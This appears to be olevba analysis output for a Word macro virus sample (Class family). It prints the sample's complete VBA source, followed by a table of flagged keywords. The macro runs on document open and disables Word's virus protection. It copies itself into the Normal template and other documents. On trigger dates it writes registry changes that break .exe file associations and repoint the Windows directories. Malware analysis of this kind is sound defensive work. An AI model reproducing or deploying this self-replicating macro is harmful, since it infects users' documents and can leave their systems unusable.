olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.cx-803f838764564522a531bd45364c2bf73f57b117
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.cx-803f838764564522a531bd45364c2bf73f57b117 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Application.EnableCancelKey = 0
Application.ShowVisualBasicEditor = False
DL90 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
VK54 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
Options.ConfirmConversions = 0
Options.SaveNormalPrompt = 0
Options.VirusProtection = 0
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
Set II64 = ActiveDocument.VBProject.VBComponents.Item(1)
LA40 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
Set II64 = NormalTemplate.VBProject.VBComponents.Item(1)
OA34 = True
End If
If OA34 <> True And LA40 <> True Then GoTo AC11
If OA34 = True Then II64.CodeModule.AddFromString ("Sub ToolsMacro()" & vbCr & "End Sub" & vbCr & "Sub ViewVBCode" & vbCr & "End Sub" & vbCr & "Sub ToolsCustomize" & vbCr & "End Sub" & vbCr & "Sub FileTemplates" & vbCr & "End Sub" & vbCr & "Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, VK54 - 1))
If LA40 = True Then II64.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(10, DL90 - 1))
If Month(Now) = Month(Now) And Day(Now) >= 20 Then
On Error Resume Next
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Config\0001\Display\Settings", "Resolution") = "1024,768"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\Root\Modem\0000", "Class") = "Monitor"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Class\Modem\0000\Init", "1") = "XT<cr>"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Class\Modem\0000\Init", "2") = "XTE0V1<cr>"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Class\Modem\0000\Settings", "Prefix") = "XT"
End If
If Month(Now) = 12 And Day(Now) = 24 Then
MsgBox "Happy Birthday Dr. Swati Charry", vbSystemModal, "SCoRPIonS"
End If
If Month(Now) >= 11 And Day(Now) = 24 Then
System.PrivateProfileString("", "HKEY_CLASSES_ROOT\.exe", "(Default)") = "txtfile"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Setup", "WinBootDir") = "C:\Dos"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "SystemRoot") = "C:\Dos"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Setup", "WinDir") = "C:\Dos"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Setup", "WinAdminDir") = "C:\Dos"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Setup", "BootDir") = "D:\"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Setup\Winbootdir", "devdir") = "C:\Dos"
End If
AC11:
End Sub





+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

